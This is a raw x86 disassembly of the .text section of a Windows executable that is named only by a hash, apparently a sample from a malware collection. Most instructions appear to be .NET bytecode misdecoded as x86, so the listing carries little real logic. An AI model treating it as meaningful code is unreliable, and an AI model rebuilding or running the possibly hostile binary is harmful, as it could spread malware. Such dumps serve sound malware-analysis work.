
1c309be2afef0bcdba3f3df8a7649127b898987ddac6fb6c69b25fd617f421d9.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	and    BYTE PTR [eax+0x0],dl
  402003:	add    BYTE PTR [eax],al
  402005:	add    BYTE PTR [eax],al
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x325800
  402013:	add    BYTE PTR [eax+0x1c],bl
  402016:	add    BYTE PTR [eax],al
  402018:	or     DWORD PTR [eax],eax
  40201a:	add    BYTE PTR [eax],al
  40201c:	add    DWORD PTR [eax],eax
  40201e:	add    BYTE PTR [esi],al
  402020:	adc    BYTE PTR [eax],ch
  402022:	add    BYTE PTR [eax],al
  402024:	inc    edi
  402025:	or     al,BYTE PTR [eax]
  402027:	add    BYTE PTR [eax+0x20],dl
  40202a:	add    BYTE PTR [eax],al
  40202c:	add    BYTE PTR [ecx],al
	...
  40204e:	add    BYTE PTR [eax],al
  402050:	das    
  402051:	imul   ecx,DWORD PTR [edi],0xea8c62cb
  402057:	(bad)  
  402058:	icebp  
  402059:	xchg   esi,eax
  40205a:	cmp    BYTE PTR [ecx],al
  40205c:	mov    ch,0xc8
  40205e:	pop    esi
  40205f:	sub    al,0x3a
  402061:	inc    edx
  402062:	mov    esi,0xb446cfb3
  402067:	dec    edx
  402068:	pop    ebx
  402069:	nop
  40206a:	mov    al,ds:0xdb484466
  40206f:	sub    al,0x8e
  402071:	out    0x58,al
  402073:	imul   edi,edi,0x7eea0624
  402079:	fwait
  40207a:	sti    
  40207b:	shl    DWORD PTR [ebx+0x722dfb6f],0x71
  402082:	vaddps xmm1,xmm7,xmm4
  402086:	pop    ss
  402087:	jmp    0x8417:0x9dbfb694
  40208e:	pop    es
  40208f:	mov    al,ds:0x82507b59
  402094:	iret   
  402095:	ds gs pusha 
  402098:	mov    ds:0xaf531fb9,al
  40209d:	jmp    0xf9a0cfae
  4020a2:	fist   WORD PTR ds:0x54104402
  4020a8:	inc    ebp
  4020a9:	fild   WORD PTR cs:[eax]
  4020ac:	pushf  
  4020ad:	mov    bl,0x26
  4020af:	mov    ds:0x27bf356c,eax
  4020b4:	xchg   ebp,eax
  4020b5:	sbb    bl,BYTE PTR [ebx-0x38]
  4020b8:	ds xor bh,bh
  4020bb:	or     DWORD PTR [ebx-0x11],edi
  4020be:	or     BYTE PTR [edx+0x7],al
  4020c1:	add    ebx,DWORD PTR [edx+0x15e77ec7]
  4020c7:	fcomp  QWORD PTR [edi+0x7f]
  4020ca:	cmp    DWORD PTR [eax],ebx
  4020cc:	xor    BYTE PTR ds:0x7f15ec68,ch
  4020d2:	add    DWORD PTR [edi+ebx*4+0x76504eda],eax
  4020d9:	enter  0x582a,0x5e
  4020dd:	or     al,0x52
  4020df:	cmp    cl,bh
  4020e1:	aas    
  4020e2:	jno    0x40214d
  4020e4:	loopne 0x402144
  4020e6:	xchg   esi,eax
  4020e7:	nop
  4020e8:	imul   edx,edx,0xbc9c4f35
  4020ee:	lods   al,BYTE PTR ds:[esi]
  4020ef:	inc    edi
  4020f0:	ror    dl,cl
  4020f2:	icebp  
  4020f3:	push   ds
  4020f4:	and    ecx,edx
  4020f6:	iret   
  4020f7:	cwde   
  4020f8:	ror    esp,cl
  4020fa:	aad    0x36
  4020fc:	pop    ds
  4020fd:	and    eax,0x17a19a4b
  402102:	push   0x86a83e3f
  402107:	sub    ebx,DWORD PTR [ebx+eax*4+0x595144cf]
  40210e:	add    BYTE PTR [edi+edx*2+0x138c0b5c],cl
  402115:	xchg   edx,eax
  402116:	mov    al,ds:0x9eda4377
  40211b:	mov    dh,0x39
  40211d:	adc    bl,BYTE PTR [eax+0x3a]
  402120:	jmp    0x23fa:0x4de39de6
  402127:	mov    ebx,0x91cad782
  40212c:	and    BYTE PTR [esp+ecx*2+0xb96d8b9],bh
  402133:	mov    edi,0x4f3482f1
  402138:	sbb    dh,BYTE PTR [edx+0x2c]
  40213b:	and    al,0x97
  40213d:	dec    esi
  40213e:	xlat   BYTE PTR ds:[ebx]
  40213f:	sbb    eax,0x8a531bfe
  402144:	lahf   
  402145:	or     edi,DWORD PTR [esi+0x9]
  402148:	push   esp
  402149:	pop    ecx
  40214a:	sbb    ecx,DWORD PTR [ebp-0x78]
  40214d:	sub    bl,BYTE PTR [ecx]
  40214f:	aas    
  402150:	sbb    esi,DWORD PTR [eax]
  402152:	push   es
  402153:	add    dl,ch
  402155:	add    DWORD PTR [eax],eax
  402157:	add    BYTE PTR [ecx],al
  402159:	add    BYTE PTR [eax],al
  40215b:	adc    DWORD PTR [eax],ebp
  40215d:	adc    eax,0x280a0000
  402162:	push   ss
  402163:	add    BYTE PTR [eax],al
  402165:	or     ch,BYTE PTR [edi+0x17]
  402168:	add    BYTE PTR [eax],al
  40216a:	or     ch,BYTE PTR [edi+0x18]
  40216d:	add    BYTE PTR [eax],al
  40216f:	or     ch,BYTE PTR [eax]
  402171:	sbb    DWORD PTR [eax],eax
  402173:	add    BYTE PTR [edx],cl
  402175:	outs   dx,DWORD PTR ds:[esi]
  402176:	sbb    al,BYTE PTR [eax]
  402178:	add    BYTE PTR [edx],cl
  40217a:	or     al,BYTE PTR [esi]
  40217c:	sub    BYTE PTR [ebx],bl
  40217e:	add    BYTE PTR [eax],al
  402180:	or     ch,BYTE PTR [edi+0x1a]
  402183:	add    BYTE PTR [eax],al
  402185:	or     ch,BYTE PTR [esi]
  402187:	inc    edx
  402188:	push   es
  402189:	sub    BYTE PTR ds:0x6f0a0000,dl
  40218f:	sbb    al,0x0
  402191:	add    BYTE PTR [edx],cl
  402193:	outs   dx,DWORD PTR ds:[esi]
  402194:	sbb    eax,0x6f0a0000
  402199:	push   ds
  40219a:	add    BYTE PTR [eax],al
  40219c:	or     ch,BYTE PTR [esi]
  40219e:	sub    eax,DWORD PTR [esi]
  4021a0:	sub    BYTE PTR ds:0x6f0a0000,dl
  4021a6:	sbb    al,0x0
  4021a8:	add    BYTE PTR [edx],cl
  4021aa:	outs   dx,DWORD PTR ds:[esi]
  4021ab:	sbb    eax,0x6f0a0000
  4021b0:	pop    ds
  4021b1:	add    BYTE PTR [eax],al
  4021b3:	or     ch,BYTE PTR [esi]
  4021b5:	adc    al,0x28
  4021b7:	adc    eax,0x720a0000
  4021bc:	add    DWORD PTR [eax],eax
  4021be:	add    BYTE PTR [eax+0x73],dh
  4021c1:	and    BYTE PTR [eax],al
  4021c3:	add    BYTE PTR [edx],cl
  4021c5:	outs   dx,DWORD PTR ds:[esi]
  4021c6:	sbb    BYTE PTR [eax],al
  4021c8:	add    BYTE PTR [edx],cl
  4021ca:	add    ch,BYTE PTR [eax]
  4021cc:	add    eax,DWORD PTR [eax]
  4021ce:	add    BYTE PTR [esi],al
  4021d0:	jle    0x4021d4
  4021d2:	add    BYTE PTR [eax],al
  4021d4:	add    al,0x28
  4021d6:	and    DWORD PTR [eax],eax
  4021d8:	add    BYTE PTR [edx],cl
  4021da:	sub    eax,0x37e0c
  4021df:	add    BYTE PTR [eax+ebp*1],al
  4021e2:	and    DWORD PTR [eax],eax
  4021e4:	add    BYTE PTR [edx],cl
  4021e6:	sub    al,0xb
  4021e8:	sub    BYTE PTR [eax+eax*1],al
  4021eb:	add    BYTE PTR [esi],al
  4021ed:	pop    ss
  4021ee:	sub    BYTE PTR [edx],ah
  4021f0:	add    BYTE PTR [eax],al
  4021f2:	or     bh,BYTE PTR [esi+0x2]
  4021f5:	add    BYTE PTR [eax],al
  4021f7:	add    al,0x28
  4021f9:	and    eax,DWORD PTR [eax]
  4021fb:	add    BYTE PTR [edx],cl
  4021fd:	sub    BYTE PTR [eax+eax*1],ah
  402200:	add    BYTE PTR [edx],cl
  402202:	or     eax,DWORD PTR [edi]
  402204:	outs   dx,DWORD PTR ds:[esi]
  402205:	and    eax,0x70a0000
  40220a:	jle    0x40220f
  40220c:	add    BYTE PTR [eax],al
  40220e:	add    al,0x7e
  402210:	add    DWORD PTR [eax],eax
  402212:	add    BYTE PTR [ebx+esi*2],al
  402215:	add    BYTE PTR es:[eax],al
  402218:	or     cl,BYTE PTR [esi+edi*2]
  40221b:	add    al,0x0
  40221d:	add    BYTE PTR [ecx+edi*1],al
  402220:	lods   al,BYTE PTR ds:[esi]
  402221:	add    BYTE PTR [eax],al
  402223:	add    BYTE PTR [eax],ch
  402225:	daa    
  402226:	add    BYTE PTR [eax],al
  402228:	or     ch,BYTE PTR [eax]
  40222a:	or     al,0x0
  40222c:	add    BYTE PTR [esi],al
  40222e:	sbb    BYTE PTR [ebp+0x1000001],cl
  402234:	adc    eax,DWORD PTR ds:0x28160511
  40223a:	sbb    DWORD PTR [eax],eax
  40223c:	add    BYTE PTR [esi],al
  40223e:	mov    ds:0x28170511,al
  402243:	sldt   WORD PTR [eax]
  402246:	push   es
  402247:	mov    ds:0x28280511,al
  40224c:	add    BYTE PTR [eax],al
  40224e:	or     ch,BYTE PTR [eax]
  402250:	sub    DWORD PTR [eax],eax
  402252:	add    BYTE PTR [edx],cl
  402254:	sub    BYTE PTR [edx],ch
  402256:	add    BYTE PTR [eax],al
  402258:	or     cl,BYTE PTR ds:0x2b28
  40225e:	or     cl,BYTE PTR [ecx]
  402260:	sub    BYTE PTR [ecx],bl
  402262:	add    BYTE PTR [eax],al
  402264:	push   es
  402265:	pop    ss
  402266:	outs   dx,DWORD PTR ds:[esi]
  402267:	sub    al,0x0
  402269:	add    BYTE PTR [edx],cl
  40226b:	sub    eax,0xd3dd05
  402270:	add    BYTE PTR [eax],al
  402272:	jle    0x402279
  402274:	add    BYTE PTR [eax],al
  402276:	add    al,0x2d
  402278:	push   edi
  402279:	or     BYTE PTR [edi+0x2d],ch
  40227c:	add    BYTE PTR [eax],al
  40227e:	or     ch,BYTE PTR [edi+ecx*2]
  402281:	sub    BYTE PTR [edi],ah
  402283:	add    BYTE PTR [eax],al
  402285:	or     ch,BYTE PTR [eax]
  402287:	or     eax,0x18060000
  40228c:	lea    eax,[ecx]
  40228e:	add    BYTE PTR [eax],al
  402290:	add    DWORD PTR [ebx],edx
  402292:	push   es
  402293:	adc    DWORD PTR [esi],eax
  402295:	push   ss
  402296:	sub    BYTE PTR [ecx],bl
  402298:	add    BYTE PTR [eax],al
  40229a:	push   es
  40229b:	mov    ds:0x28170611,al
  4022a0:	sldt   WORD PTR [eax]
  4022a3:	push   es
  4022a4:	mov    ds:0x28280611,al
  4022a9:	add    BYTE PTR [eax],al
  4022ab:	or     ch,BYTE PTR [eax]
  4022ad:	sub    DWORD PTR [eax],eax
  4022af:	add    BYTE PTR [edx],cl
  4022b1:	sub    BYTE PTR [edx],ch
  4022b3:	add    BYTE PTR [eax],al
  4022b5:	or     cl,BYTE PTR ds:0x2b28
  4022bb:	or     cl,BYTE PTR [ecx]
  4022bd:	sub    BYTE PTR [edi],cl
  4022bf:	add    BYTE PTR [eax],al
  4022c1:	push   es
  4022c2:	pop    ss
  4022c3:	outs   dx,DWORD PTR ds:[esi]
  4022c4:	sub    al,0x0
  4022c6:	add    BYTE PTR [edx],cl
  4022c8:	sub    al,0x6
  4022ca:	pop    ss
  4022cb:	add    BYTE PTR ds:0x8040000,0x14
  4022d2:	inc    BYTE PTR [esi]
  4022d4:	add    al,BYTE PTR [eax]
  4022d6:	add    BYTE PTR [esi],al
  4022d8:	jae    0x402308
  4022da:	add    BYTE PTR [eax],al
  4022dc:	or     ch,BYTE PTR [edi+0x2f]
  4022df:	add    BYTE PTR [eax],al
  4022e1:	or     cl,BYTE PTR [eax]
  4022e3:	jle    0x4022ea
  4022e5:	add    BYTE PTR [eax],al
  4022e7:	add    al,0x6f
  4022e9:	xor    BYTE PTR [eax],al
  4022eb:	add    BYTE PTR [edx],cl
  4022ed:	or     BYTE PTR [edi+0x31],ch
  4022f0:	add    BYTE PTR [eax],al
  4022f2:	or     bl,dh
  4022f4:	push   eax
  4022f5:	sub    BYTE PTR es:[edx],dh
  4022f8:	add    BYTE PTR [eax],al
  4022fa:	or     ch,BYTE PTR [eax]
  4022fc:	daa    
  4022fd:	add    BYTE PTR [eax],al
  4022ff:	or     ch,BYTE PTR [eax]
  402301:	push   cs
  402302:	add    BYTE PTR [eax],al
  402304:	push   es
  402305:	pop    ss
  402306:	lea    eax,[ecx]
  402308:	add    BYTE PTR [eax],al
  40230a:	add    DWORD PTR [ebx],edx
  40230c:	pop    es
  40230d:	adc    DWORD PTR [edi],eax
  40230f:	push   ss
  402310:	jle    0x402314
  402312:	add    BYTE PTR [eax],al
  402314:	add    al,0xa2
  402316:	adc    DWORD PTR [edi],eax
  402318:	sub    BYTE PTR [eax],ch
  40231a:	add    BYTE PTR [eax],al
  40231c:	or     ch,BYTE PTR [edi+0x33]
  40231f:	add    BYTE PTR [eax],al
  402321:	or     dl,BYTE PTR [edi]
  402323:	sub    BYTE PTR [edx],ah
  402325:	add    BYTE PTR [eax],al
  402327:	or     bl,dh
  402329:	sbb    edx,DWORD PTR [ebx]
  40232b:	add    al,0x28
  40232d:	xor    al,BYTE PTR [eax]
  40232f:	add    BYTE PTR [edx],cl
  402331:	adc    DWORD PTR [edi+ebp*2],eax
  402334:	xor    al,0x0
  402336:	add    BYTE PTR [edx],cl
  402338:	outs   dx,DWORD PTR ds:[esi]
  402339:	xor    eax,DWORD PTR [eax]
  40233b:	add    BYTE PTR [edx],cl
  40233d:	pop    ss
  40233e:	sub    BYTE PTR [edx],ah
  402340:	add    BYTE PTR [eax],al
  402342:	or     bl,dh
  402344:	add    BYTE PTR [edx],ch
  402346:	add    BYTE PTR [eax],al
  402348:	inc    ecx
  402349:	xor    al,0x0
  40234b:	add    BYTE PTR [eax],al
  40234d:	add    BYTE PTR [eax],al
  40234f:	add    BYTE PTR [edi+0x2000000],dl
  402355:	add    DWORD PTR [eax],eax
  402357:	add    BYTE PTR [ecx+0x35000001],bl
  40235d:	add    BYTE PTR [eax],al
  40235f:	add    BYTE PTR [edx],ch
  402361:	add    BYTE PTR [eax],al
  402363:	add    DWORD PTR [eax],eax
  402365:	add    BYTE PTR [eax],al
  402367:	add    BYTE PTR [edi+0x2000000],dl
  40236d:	add    DWORD PTR [eax],eax
  40236f:	add    dh,cl
  402371:	add    DWORD PTR [eax],eax
  402373:	add    BYTE PTR [ebx],bl
  402375:	add    BYTE PTR [eax],al
  402377:	add    BYTE PTR [ecx],ch
  402379:	add    BYTE PTR [eax],al
  40237b:	add    DWORD PTR [edx],esi
  40237d:	add    ebp,DWORD PTR [edi+0x35]
  402380:	add    BYTE PTR [eax],al
  402382:	or     ch,BYTE PTR [eax]
  402384:	add    BYTE PTR ss:[eax],al
  402387:	or     ch,BYTE PTR [edx]
  402389:	add    BYTE PTR [eax],al
  40238b:	add    BYTE PTR [ebx],dl
  40238d:	xor    BYTE PTR [esi],al
  40238f:	add    BYTE PTR [esi],bh
  402391:	add    al,BYTE PTR [eax]
  402393:	add    BYTE PTR [edx],al
  402395:	add    BYTE PTR [eax],al
  402397:	adc    DWORD PTR [edx],eax
  402399:	adc    eax,DWORD PTR ds:0x38061316
  40239f:	daa    
  4023a0:	add    al,BYTE PTR [eax]
  4023a2:	add    BYTE PTR [ecx],dl
  4023a4:	add    eax,0xa9a0611
  4023a9:	push   es
  4023aa:	outs   dx,DWORD PTR ds:[esi]
  4023ab:	aaa    
  4023ac:	add    BYTE PTR [eax],al
  4023ae:	or     dl,BYTE PTR [esi]
  4023b0:	ds cmc 
  4023b2:	add    DWORD PTR [eax],eax
  4023b4:	add    BYTE PTR [esi],al
  4023b6:	push   ss
  4023b7:	outs   dx,DWORD PTR ds:[esi]
  4023b8:	cmp    BYTE PTR [eax],al
  4023ba:	add    BYTE PTR [edx],cl
  4023bc:	pop    ds
  4023bd:	sub    eax,0x16060e2e
  4023c2:	outs   dx,DWORD PTR ds:[esi]
  4023c3:	cmp    BYTE PTR [eax],al
  4023c5:	add    BYTE PTR [edx],cl
  4023c7:	pop    ds
  4023c8:	das    
  4023c9:	inc    eax
  4023ca:	fadd   QWORD PTR [ecx]
  4023cc:	add    BYTE PTR [eax],al
  4023ce:	push   es
  4023cf:	pop    ss
  4023d0:	lea    ebp,[ebx]
  4023d2:	add    BYTE PTR [eax],al
  4023d4:	add    DWORD PTR [ebx],edx
  4023d6:	pop    es
  4023d7:	adc    DWORD PTR [edi],eax
  4023d9:	push   ss
  4023da:	pop    ds
  4023db:	cmp    bl,BYTE PTR [ebp+0x396f0711]
  4023e1:	add    BYTE PTR [eax],al
  4023e3:	or     cl,BYTE PTR [ebx]
  4023e5:	pop    es
  4023e6:	push   ss
  4023e7:	call   0xa00:0x3a6f17
  4023ee:	outs   dx,DWORD PTR ds:[esi]
  4023ef:	cmp    eax,DWORD PTR [eax]
  4023f1:	add    BYTE PTR [edx],cl
  4023f3:	or     al,0x8
  4023f5:	and    eax,0x7d390813
  4023fa:	add    DWORD PTR [eax],eax
  4023fc:	add    dh,bh
  4023fe:	adc    edi,DWORD PTR [esi+0x8]
  402401:	add    BYTE PTR [eax],al
  402403:	add    al,0x2d
  402405:	jp     0x402426
  402407:	or     DWORD PTR [ebx+0x3d],esi
  40240a:	add    BYTE PTR [eax],al
  40240c:	or     ah,BYTE PTR ds:0x772
  402412:	jo     0x40242a
  402414:	sub    BYTE PTR [esi],bh
  402416:	add    BYTE PTR [eax],al
  402418:	or     ah,BYTE PTR ds:0xb72
  40241e:	jo     0x402437
  402420:	sub    BYTE PTR [esi],bh
  402422:	add    BYTE PTR [eax],al
  402424:	or     ah,BYTE PTR ds:0xf72
  40242a:	jo     0x402444
  40242c:	sub    BYTE PTR [esi],bh
  40242e:	add    BYTE PTR [eax],al
  402430:	or     ah,BYTE PTR ds:0x1b72
  402436:	jo     0x402451
  402438:	sub    BYTE PTR [esi],bh
  40243a:	add    BYTE PTR [eax],al
  40243c:	or     ah,BYTE PTR ds:0x1f72
  402442:	jo     0x40245e
  402444:	sub    BYTE PTR [esi],bh
  402446:	add    BYTE PTR [eax],al
  402448:	or     ah,BYTE PTR ds:0x2372
  40244e:	jo     0x40246b
  402450:	sub    BYTE PTR [esi],bh
  402452:	add    BYTE PTR [eax],al
  402454:	or     ah,BYTE PTR ds:0x3172
  40245a:	jo     0x402478
  40245c:	sub    BYTE PTR [esi],bh
  40245e:	add    BYTE PTR [eax],al
  402460:	or     ah,BYTE PTR ds:0x3572
  402466:	jo     0x402485
  402468:	sub    BYTE PTR [esi],bh
  40246a:	add    BYTE PTR [eax],al
  40246c:	or     ah,BYTE PTR ds:0x4b72
  402472:	jo     0x402492
  402474:	sub    BYTE PTR [esi],bh
  402476:	add    BYTE PTR [eax],al
  402478:	or     bh,dh
  40247a:	adc    eax,DWORD PTR [eax+0x4000008]
  402480:	(bad)  
  402481:	adc    edi,DWORD PTR [esi+0x8]
  402484:	add    BYTE PTR [eax],al
  402486:	add    al,0x11
  402488:	or     BYTE PTR [edx],dl
  40248a:	or     DWORD PTR [eax],ebp
  40248c:	aas    
  40248d:	add    BYTE PTR [eax],al
  40248f:	or     bh,BYTE PTR [ecx]
  402491:	in     eax,0x0
  402493:	add    BYTE PTR [eax],al
  402495:	adc    DWORD PTR [ecx],ecx
  402497:	inc    ebp
  402498:	or     DWORD PTR [eax],eax
  40249a:	add    BYTE PTR [eax],al
  40249c:	add    eax,0x15000000
  4024a1:	add    BYTE PTR [eax],al
  4024a3:	add    BYTE PTR ds:0x20000000,dl
  4024a9:	add    BYTE PTR [eax],al
  4024ab:	add    BYTE PTR [ebx],ch
  4024ad:	add    BYTE PTR [eax],al
  4024af:	add    BYTE PTR [ebx],ch
  4024b1:	add    BYTE PTR [eax],al
  4024b3:	add    BYTE PTR [ebx],ch
  4024b5:	add    BYTE PTR [eax],al
  4024b7:	add    BYTE PTR [ebx],ch
  4024b9:	add    BYTE PTR [eax],al
  4024bb:	add    BYTE PTR [edx+0x38000000],dh
  4024c1:	mov    ch,0x0
  4024c3:	add    BYTE PTR [eax],al
  4024c5:	sub    BYTE PTR [eax+eax*1],al
  4024c8:	add    BYTE PTR [esi],al
  4024ca:	push   ss
  4024cb:	sub    BYTE PTR [edx],ah
  4024cd:	add    BYTE PTR [eax],al
  4024cf:	or     bh,BYTE PTR [eax]
  4024d1:	out    dx,eax
  4024d2:	add    BYTE PTR [eax],al
  4024d4:	add    BYTE PTR [edi],dl
  4024d6:	add    BYTE PTR [ecx],0x0
  4024d9:	add    BYTE PTR [eax+edi*1],al
  4024dc:	in     al,0x0
  4024de:	add    BYTE PTR [eax],al
  4024e0:	push   ss
  4024e1:	add    BYTE PTR [eax+eax*1],0x0
  4024e5:	add    al,0x38
  4024e7:	fld    DWORD PTR [eax]
  4024e9:	add    BYTE PTR [eax],al
  4024eb:	or     BYTE PTR [edx+0x1f],dh
  4024ee:	add    BYTE PTR [eax],al
  4024f0:	jo     0x40251a
  4024f2:	inc    eax
  4024f3:	add    BYTE PTR [eax],al
  4024f5:	or     ch,BYTE PTR ds:0x2372080d
  4024fb:	add    BYTE PTR [eax],al
  4024fd:	jo     0x402527
  4024ff:	inc    eax
  402500:	add    BYTE PTR [eax],al
  402502:	or     ch,BYTE PTR [eax*2+0x386f1606]
  402509:	add    BYTE PTR [eax],al
  40250b:	or     cl,BYTE PTR [ebx+ebp*1+0x72010000]
  402512:	popa   
  402513:	add    BYTE PTR [eax],al
  402515:	jo     0x40253f
  402517:	inc    ecx
  402518:	add    BYTE PTR [eax],al
  40251a:	or     cl,BYTE PTR ds:0x2728
  402520:	or     ch,BYTE PTR [eax]
  402522:	adc    BYTE PTR [eax],al
  402524:	add    BYTE PTR [esi],al
  402526:	sbb    BYTE PTR [ebp+0x1000001],cl
  40252c:	adc    ecx,DWORD PTR [edx]
  40252e:	adc    DWORD PTR [edx],ecx
  402530:	push   ss
  402531:	pop    es
  402532:	push   ss
  402533:	call   0xa209:0x170a11a2
  40253a:	adc    DWORD PTR [edx],ecx
  40253c:	sub    BYTE PTR [eax],ch
  40253e:	add    BYTE PTR [eax],al
  402540:	or     dl,BYTE PTR [ebx]
  402542:	add    al,0x11
  402544:	add    al,0x28
  402546:	add    BYTE PTR ss:[eax],al
  402549:	or     al,BYTE PTR [edi]
  40254b:	mov    gs,WORD PTR [ecx+0x18]
  40254e:	das    
  40254f:	or     ebp,DWORD PTR [eax]
  402551:	add    al,0x0
  402553:	add    BYTE PTR [esi],al
  402555:	pop    ss
  402556:	sub    BYTE PTR [edx],ah
  402558:	add    BYTE PTR [eax],al
  40255a:	or     al,BYTE PTR [esi]
  40255c:	pop    es
  40255d:	push   ss
  40255e:	call   0x170a:0x376f
  402565:	pop    eax
  402566:	outs   dx,DWORD PTR ds:[esi]
  402567:	cmp    al,BYTE PTR [eax]
  402569:	add    BYTE PTR [edx],cl
  40256b:	add    BYTE PTR [edx],0x0
  40256e:	add    BYTE PTR [ebx+ebp*1],al
  402571:	push   edx
  402572:	pop    ss
  402573:	add    BYTE PTR ds:0x2b040000,0x4a
  40257a:	sub    BYTE PTR [edx],dh
  40257c:	add    BYTE PTR [eax],al
  40257e:	or     ch,BYTE PTR [eax]
  402580:	daa    
  402581:	add    BYTE PTR [eax],al
  402583:	or     ch,BYTE PTR [eax]
  402585:	adc    DWORD PTR [eax],eax
  402587:	add    BYTE PTR [esi],al
  402589:	pop    ss
  40258a:	lea    eax,[ecx]
  40258c:	add    BYTE PTR [eax],al
  40258e:	add    DWORD PTR [ebx],edx
  402590:	or     edx,DWORD PTR [ecx]
  402592:	or     edx,DWORD PTR [esi]
  402594:	push   es
  402595:	mov    ds:0x28280b11,al
  40259a:	add    BYTE PTR [eax],al
  40259c:	or     ch,BYTE PTR [edi+0x33]
  40259f:	add    BYTE PTR [eax],al
  4025a1:	or     dl,BYTE PTR [edi]
  4025a3:	sub    BYTE PTR [edx],ah
  4025a5:	add    BYTE PTR [eax],al
  4025a7:	or     ch,BYTE PTR [ebx]
  4025a9:	sbb    bh,BYTE PTR [esi+0x3]
  4025ac:	add    BYTE PTR [eax],al
  4025ae:	add    al,0x2d
  4025b0:	or     BYTE PTR [esi],al
  4025b2:	add    BYTE PTR [ebx],0x0
  4025b5:	add    BYTE PTR [ebx+ebp*1],al
  4025b8:	or     ebp,DWORD PTR [eax]
  4025ba:	add    al,0x0
  4025bc:	add    BYTE PTR [esi],al
  4025be:	pop    ss
  4025bf:	sub    BYTE PTR [edx],ah
  4025c1:	add    BYTE PTR [eax],al
  4025c3:	or     dl,BYTE PTR [ecx]
  4025c5:	push   es
  4025c6:	pop    ss
  4025c7:	pop    eax
  4025c8:	adc    eax,DWORD PTR [esi]
  4025ca:	adc    DWORD PTR [esi],eax
  4025cc:	adc    DWORD PTR ds:0xce3f698e,eax
  4025d2:	std    
  4025d3:	(bad)  
  4025d4:	jmp    FWORD PTR [edx]
  4025d6:	add    BYTE PTR [eax],al
  4025d8:	add    esi,DWORD PTR [eax]
  4025da:	add    DWORD PTR [eax],eax
  4025dc:	pusha  
  4025dd:	add    BYTE PTR [eax],al
  4025df:	add    BYTE PTR [eax],al
  4025e1:	add    BYTE PTR [eax],al
  4025e3:	add    BYTE PTR [eax],ch
  4025e5:	or     eax,DWORD PTR [eax]
  4025e7:	add    BYTE PTR [esi],al
  4025e9:	sub    BYTE PTR [esi],dh
  4025eb:	add    BYTE PTR [eax],al
  4025ed:	or     ch,BYTE PTR [eax]
  4025ef:	sub    eax,DWORD PTR [eax]
  4025f1:	add    BYTE PTR [edx],cl
  4025f3:	sub    BYTE PTR [edx],dl
  4025f5:	add    BYTE PTR [eax],al
  4025f7:	push   es
  4025f8:	sub    BYTE PTR [esi],dh
  4025fa:	add    BYTE PTR [eax],al
  4025fc:	or     ch,BYTE PTR [eax]
  4025fe:	sub    eax,DWORD PTR [eax]
  402600:	add    BYTE PTR [edx],cl
  402602:	sub    BYTE PTR [ebx],dl
  402604:	add    BYTE PTR [eax],al
  402606:	push   es
  402607:	sub    BYTE PTR [esi],dh
  402609:	add    BYTE PTR [eax],al
  40260b:	or     ch,BYTE PTR [eax]
  40260d:	sub    eax,DWORD PTR [eax]
  40260f:	add    BYTE PTR [edx],cl
  402611:	sub    BYTE PTR [eax],bl
  402613:	add    BYTE PTR [eax],al
  402615:	push   es
  402616:	sub    BYTE PTR [esi],dh
  402618:	add    BYTE PTR [eax],al
  40261a:	or     ch,BYTE PTR [eax]
  40261c:	adc    eax,0x28060000
  402621:	add    BYTE PTR ss:[eax],al
  402624:	or     ch,BYTE PTR [eax]
  402626:	adc    al,0x0
  402628:	add    BYTE PTR [esi],al
  40262a:	sub    BYTE PTR [esi],dh
  40262c:	add    BYTE PTR [eax],al
  40262e:	or     ch,BYTE PTR [eax]
  402630:	push   ss
  402631:	add    BYTE PTR [eax],al
  402633:	push   es
  402634:	sub    BYTE PTR [esi],dh
  402636:	add    BYTE PTR [eax],al
  402638:	or     ch,BYTE PTR [eax]
  40263a:	pop    ss
  40263b:	add    BYTE PTR [eax],al
  40263d:	push   es
  40263e:	sub    BYTE PTR [esi],dh
  402640:	add    BYTE PTR [eax],al
  402642:	or     ch,BYTE PTR [edx]
  402644:	jle    0x40265c
  402646:	add    BYTE PTR [ecx],0x0
  402649:	add    BYTE PTR [esp+edx*1],al
  40264c:	add    BYTE PTR [edx],0x0
  40264f:	add    BYTE PTR [esp+edx*1],al
  402652:	add    BYTE PTR [ebx],0x0
  402655:	add    BYTE PTR [edi+edx*1],al
  402658:	add    BYTE PTR [eax+eax*1],0x0
  40265c:	add    al,0x16
  40265e:	add    BYTE PTR ds:0x2a040000,0x1e
  402665:	add    ch,BYTE PTR [eax]
  402667:	inc    edx
  402668:	add    BYTE PTR [eax],al
  40266a:	or     ch,BYTE PTR [edx]
  40266c:	push   ds
  40266d:	add    ch,BYTE PTR [eax]
  40266f:	inc    edx
  402670:	add    BYTE PTR [eax],al
  402672:	or     ch,BYTE PTR [edx]
  402674:	adc    esi,DWORD PTR [eax]
  402676:	add    al,BYTE PTR [eax]
  402678:	xor    eax,DWORD PTR [eax]
  40267a:	add    BYTE PTR [eax],al
  40267c:	add    eax,DWORD PTR [eax]
  40267e:	add    BYTE PTR [ecx],dl
  402680:	jle    0x402688
  402682:	add    BYTE PTR [eax],al
  402684:	add    al,0x14
  402686:	sub    BYTE PTR [ebp+0x0],al
  402689:	add    BYTE PTR [edx],cl
  40268b:	sub    al,0x20
  40268d:	jb     0x402706
  40268f:	add    BYTE PTR [eax],al
  402691:	jo     0x402663
  402693:	add    eax,DWORD PTR [eax]
  402695:	add    BYTE PTR [edx],al
  402697:	sub    BYTE PTR [esi+0x0],al
  40269a:	add    BYTE PTR [edx],cl
  40269c:	outs   dx,DWORD PTR ds:[esi]
  40269d:	inc    edi
  40269e:	add    BYTE PTR [eax],al
  4026a0:	or     dh,BYTE PTR [ebx+0x48]
  4026a3:	add    BYTE PTR [eax],al
  4026a5:	or     cl,BYTE PTR [edx]
  4026a7:	push   es
  4026a8:	add    BYTE PTR [esi],0x0
  4026ab:	add    BYTE PTR [esi+edi*2],al
  4026ae:	push   es
  4026af:	add    BYTE PTR [eax],al
  4026b1:	add    al,0x2a
  4026b3:	sbb    bh,BYTE PTR [esi+0x7]
  4026b6:	add    BYTE PTR [eax],al
  4026b8:	add    al,0x2a
  4026ba:	push   ds
  4026bb:	add    al,BYTE PTR [eax+0x4000007]
  4026c1:	sub    dl,BYTE PTR [esi+0x28]
  4026c4:	or     BYTE PTR [eax],al
  4026c6:	add    BYTE PTR [esi],al
  4026c8:	jb     0x402655
  4026ca:	add    BYTE PTR [eax],al
  4026cc:	jo     0x40274c
  4026ce:	pop    es
  4026cf:	add    BYTE PTR [eax],al
  4026d1:	add    al,0x6f
  4026d3:	dec    ecx
